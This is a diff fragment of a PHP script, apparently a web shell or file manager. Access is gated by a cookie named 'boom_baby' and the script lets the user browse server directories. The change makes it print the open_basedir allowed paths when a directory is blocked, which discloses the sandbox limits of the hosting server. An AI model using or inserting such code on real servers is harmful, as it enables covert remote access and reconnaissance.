@@ -164,8 +164,21 @@ if(($set['mode'] == "1")and($_COOKIE['boom_baby'] != $set['password'])){
     exit;
     }
 
-if(!@is_dir($dir)) echo " 目录 " . $dir . " 无权访问或不存在";
-else chdir($dir);
+if(!@is_dir($dir)){
+    $error = error_get_last();
+    $em = $error['message'];
+    if(!empty($em)){
+        $adir = explode(':', $em, 3);
+        //print_r($adir);
+        echo " <b>目录 " . $dir . " 无权访问!</b> " . " open_basedir 允许的路径：" . $adir[2];
+    }else{
+        echo " <b>目录 " . $dir . " 或不存在!</b> ";
+    }
+}else{
+    chdir($dir);
+}
+
+
 $open = opendir("./");
 
 if(!empty($_GET['m'])and $_GET['m'] == "show"){
